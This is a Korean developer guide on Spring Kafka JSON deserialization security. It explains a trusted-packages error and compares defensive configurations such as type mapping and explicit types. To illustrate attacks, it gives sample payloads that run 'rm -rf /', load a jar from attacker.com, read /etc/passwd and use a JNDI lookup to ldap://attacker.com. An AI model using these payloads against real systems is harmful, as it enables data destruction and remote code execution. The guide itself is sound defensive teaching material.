# Kafka JSON 역직렬화 보안

## 목차
1. [문제 발생 원인](#문제-발생-원인)
2. [역직렬화 공격 원리](#역직렬화-공격-원리)
3. [보안 방어 전략](#보안-방어-전략)
4. [실전 구현 가이드](#실전-구현-가이드)

---

## 문제 발생 원인

### 테스트 실패 로그
```
java.lang.IllegalArgumentException: 
The class 'kr.hhplus.be.server.application.coupon.CouponIssueRequest' 
is not in the trusted packages: [java.util, java.lang]
```

### 왜 발생했는가?

#### 1. Spring Kafka의 기본 보안 정책
```java
// JsonDeserializer 내부 기본값
private static final Set<String> TRUSTED_PACKAGES = 
    Set.of("java.util", "java.lang");
```

Spring Kafka는 **보안상 기본적으로 `java.util`, `java.lang` 패키지만 역직렬화를 허용**합니다.

#### 2. 메시지 전송 흐름
```
Producer (CouponService)
    ↓ 직렬화
    CouponIssueRequest → JSON
    ↓ Kafka
    JSON 메시지 저장
    ↓ Consumer
    JSON → CouponIssueRequest (역직렬화)
    ↓ ❌ 실패
    "CouponIssueRequest는 신뢰할 수 없는 패키지"
```

#### 3. Type Header 메커니즘
Producer가 메시지를 보낼 때:
```json
Headers: {
  "__TypeId__": "kr.hhplus.be.server.application.coupon.CouponIssueRequest"
}
Body: {
  "requestId": "...",
  "couponId": "...",
  "userId": "..."
}
```

Consumer가 받을 때:
```java
String className = header.get("__TypeId__");
if (!isTrustedPackage(className)) {
    throw new IllegalArgumentException(
        "The class '" + className + "' is not in the trusted packages"
    );
}
```

---

## 역직렬화 공격 원리

### 왜 역직렬화가 위험한가?

**역직렬화 = 클래스 생성자 호출 = 코드 실행**

#### 공격 시나리오

##### 1. 악의적인 메시지 주입
```json
{
  "@class": "java.lang.ProcessBuilder",
  "command": ["rm", "-rf", "/"]
}
```

##### 2. 역직렬화 시 코드 실행
```java
// Jackson이 역직렬화하면...
ProcessBuilder pb = new ProcessBuilder("rm", "-rf", "/");
// 생성자 실행 → 시스템 명령 실행!
```

##### 3. 실제 공격 예시
```json
// 원격 코드 실행 (RCE)
{
  "@class": "java.net.URLClassLoader",
  "urls": ["http://attacker.com/malware.jar"]
}

// 파일 시스템 접근
{
  "@class": "java.io.FileInputStream",
  "path": "/etc/passwd"
}

// 스크립트 실행
{
  "@class": "javax.script.ScriptEngineManager",
  "script": "malicious code"
}
```

### 실제 CVE 사례

#### CVE-2017-7525 (Jackson)
```java
// 공격자가 전송
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/Exploit",
  "autoCommit": true
}

// 역직렬화 시 JNDI Injection → RCE
```

#### CVE-2016-1000027 (Spring Data Redis)
```java
// 신뢰하지 않는 데이터 역직렬화
Object obj = redisTemplate.opsForValue().get(key);
// 공격자가 Redis에 악의적인 직렬화 데이터 주입 → RCE
```

### 왜 java.util, java.lang은 안전한가?

#### 안전한 클래스들
```java
// 생성자에서 위험한 동작 없음
String s = new String("hello");        // 문자열 생성만
Integer i = new Integer(123);          // 숫자 생성만
ArrayList list = new ArrayList();      // 메모리 할당만
HashMap map = new HashMap();           // 메모리 할당만
```

#### 위험한 클래스들 (기본 차단)
```java
// 생성자/메서드에서 위험한 동작 수행
ProcessBuilder pb = new ProcessBuilder("cmd");     // 시스템 명령
URLClassLoader cl = new URLClassLoader(urls);      // 외부 코드 로드
FileInputStream fis = new FileInputStream(path);   // 파일 접근
Runtime.getRuntime().exec("cmd");                  // 명령 실행
ScriptEngine engine = new ScriptEngineManager();   // 스크립트 실행
```

#### JDK 표준 라이브러리의 신뢰성
- Oracle/OpenJDK가 보안 검증
- 수십 년간 검증된 코드
- 악의적인 코드 포함 불가능
- 제한된 기능만 제공

---

## 보안 방어 전략

### 전략 비교표

| 전략 | 보안 수준 | 복잡도 | 성능 | 유연성 | 추천 환경 |
|------|-----------|--------|------|--------|-----------|
| **TRUSTED_PACKAGES: "*"** | ⭐ | 낮음 | 높음 | 높음 | 내부 시스템만 |
| **특정 패키지 허용** | ⭐⭐⭐ | 낮음 | 높음 | 중간 | 일반적 |
| **Type Mapping** | ⭐⭐⭐⭐ | 낮음 | 높음 | 중간 | 내부 시스템 |
| **명시적 타입 지정** | ⭐⭐⭐⭐ | 낮음 | 높음 | 낮음 | 외부 노출 |
| **메시지 서명** | ⭐⭐⭐⭐⭐ | 높음 | 중간 | 높음 | 금융/보안 중요 |
| **API Gateway 변환** | ⭐⭐⭐⭐⭐ | 중간 | 중간 | 높음 | 외부 API |
| **Schema Registry** | ⭐⭐⭐⭐ | 중간 | 매우높음 | 중간 | 엔터프라이즈 |

### 전략 1: 전체 패키지 허용 (현재 적용)

#### 설정
```java
@Configuration
public class KafkaConsumer {
    @Bean
    public ConsumerFactory<String, Object> consumerFactory() {
        Map<String, Object> config = new HashMap<>();
        config.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);
        config.put(ConsumerConfig.GROUP_ID_CONFIG, groupId);
        config.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        config.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
        
        // 모든 패키지 허용
        config.put(JsonDeserializer.TRUSTED_PACKAGES, "*");
        
        return new DefaultKafkaConsumerFactory<>(config);
    }
}
```

#### 장점
- 설정 간단
- 유연성 높음 (어떤 클래스든 역직렬화 가능)
- 성능 좋음 (검증 오버헤드 없음)

#### 단점
- 보안 취약 (모든 클래스 허용)
- 외부 공격에 노출 시 위험

#### 적합한 환경
- ✅ 내부 시스템만 사용
- ✅ Kafka가 내부 네트워크에만 노출
- ✅ 방화벽/VPC로 외부 접근 차단
- ✅ Producer가 신뢰할 수 있는 애플리케이션만

#### 부적합한 환경
- ❌ 외부 시스템이 Kafka에 메시지 전송 가능
- ❌ 멀티 테넌트 환경 (여러 팀이 같은 Kafka 사용)
- ❌ 공개 API가 Kafka로 메시지 전달

### 전략 2: 특정 패키지만 허용

#### 설정
```java
@Bean
public ConsumerFactory<String, Object> consumerFactory() {
    Map<String, Object> config = new HashMap<>();
    // ...
    
    // 특정 패키지만 허용
    config.put(JsonDeserializer.TRUSTED_PACKAGES, 
        "kr.hhplus.be.server.application.coupon," +
        "kr.hhplus.be.server.domain.order," +
        "kr.hhplus.be.server.domain.payment");
    
    return new DefaultKafkaConsumerFactory<>(config);
}
```

#### 장점
- 화이트리스트 방식 (명시적 허용)
- 설정 간단
- 성능 좋음

#### 단점
- 새 이벤트 추가 시 설정 변경 필요
- 패키지 리팩토링 시 설정 수정 필요

#### 적합한 환경
- ✅ 프로덕션 환경
- ✅ 내부 시스템
- ✅ 패키지 구조가 안정적

### 전략 3: Type Mapping (화이트리스트)

#### 설정
```java
// Producer Config
@Bean
public ProducerFactory<String, Object> producerFactory() {
    Map<String, Object> config = new HashMap<>();
    config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServer);
    config.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
    config.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);
    
    // 별칭 → 클래스 매핑
    config.put(JsonSerializer.TYPE_MAPPINGS, 
        "couponRequest:kr.hhplus.be.server.application.coupon.CouponIssueRequest," +
        "orderEvent:kr.hhplus.be.server.domain.order.OrderCreatedEvent," +
        "paymentEvent:kr.hhplus.be.server.domain.payment.PaymentCompletedEvent");
    
    return new DefaultKafkaProducerFactory<>(config);
}

// Consumer Config
@Bean
public ConsumerFactory<String, Object> consumerFactory() {
    Map<String, Object> config = new HashMap<>();
    config.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);
    config.put(ConsumerConfig.GROUP_ID_CONFIG, groupId);
    config.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
    config.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
    
    // 동일한 매핑
    config.put(JsonDeserializer.TYPE_MAPPINGS, 
        "couponRequest:kr.hhplus.be.server.application.coupon.CouponIssueRequest," +
        "orderEvent:kr.hhplus.be.server.domain.order.OrderCreatedEvent," +
        "paymentEvent:kr.hhplus.be.server.domain.payment.PaymentCompletedEvent");
    
    // TRUSTED_PACKAGES 불필요 (매핑된 것만 허용)
    config.put(JsonDeserializer.TRUSTED_PACKAGES, "");
    
    return new DefaultKafkaConsumerFactory<>(config);
}
```

#### 동작 방식
```
Producer 전송:
Headers: { "__TypeId__": "couponRequest" }  // 별칭만 전송
Body: { "requestId": "...", "couponId": "...", "userId": "..." }

Consumer 수신:
1. "__TypeId__" 헤더 읽기 → "couponRequest"
2. TYPE_MAPPINGS에서 매핑 찾기 → CouponIssueRequest.class
3. 매핑 있으면 역직렬화, 없으면 예외
```

#### 장점
- 최고 수준의 보안 (화이트리스트)
- 클래스명 노출 안 됨 (별칭만 전송)
- 패키지 리팩토링 유연 (별칭만 유지하면 됨)
- 명시적 타입 관리

#### 단점
- Producer/Consumer 양쪽 설정 필요
- 새 이벤트 추가 시 매핑 추가 필요

#### 적합한 환경
- ✅ 프로덕션 환경
- ✅ 마이크로서비스
- ✅ 보안이 중요한 시스템

### 전략 4: 명시적 타입 지정

#### 설정
```java
@Bean
public ConsumerFactory<String, CouponIssueRequest> consumerFactory() {
    Map<String, Object> config = new HashMap<>();
    config.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
    
    // 기본 타입 명시
    config.put(JsonDeserializer.VALUE_DEFAULT_TYPE, CouponIssueRequest.class);
    
    // Type Header 무시 (더 안전)
    config.put(JsonDeserializer.USE_TYPE_INFO_HEADERS, false);
    
    // TRUSTED_PACKAGES 사용 안 함
    config.put(JsonDeserializer.TRUSTED_PACKAGES, "");
    
    return new DefaultKafkaConsumerFactory<>(
        config, 
        new StringDeserializer(), 
        new JsonDeserializer<>(CouponIssueRequest.class)
    );
}
```

#### 장점
- 최고 수준의 보안
- Type Header 조작 불가능
- 명시적 타입 보장

#### 단점
- 토픽당 하나의 타입만 가능
- 유연성 낮음

#### 적합한 환경
- ✅ 외부 시스템 연동
- ✅ 단일 타입 토픽
- ✅ 보안 최우선

---

## 실전 구현 가이드

다음 문서 참조:
- [메시지 서명 구현](./MESSAGE_SIGNING.md)
- [API Gateway 패턴](./API_GATEWAY_PATTERN.md)
- [String vs Object 선택 가이드](./PAYLOAD_SELECTION_GUIDE.md)

---

## 참고 자료

### CVE 목록
- CVE-2017-7525: Jackson Deserialization RCE
- CVE-2016-1000027: Spring Data Redis Deserialization
- CVE-2017-17485: Jackson Polymorphic Deserialization

### 관련 문서
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Spring Kafka Security](https://docs.spring.io/spring-kafka/reference/kafka/serdes.html)
- [Jackson Security](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
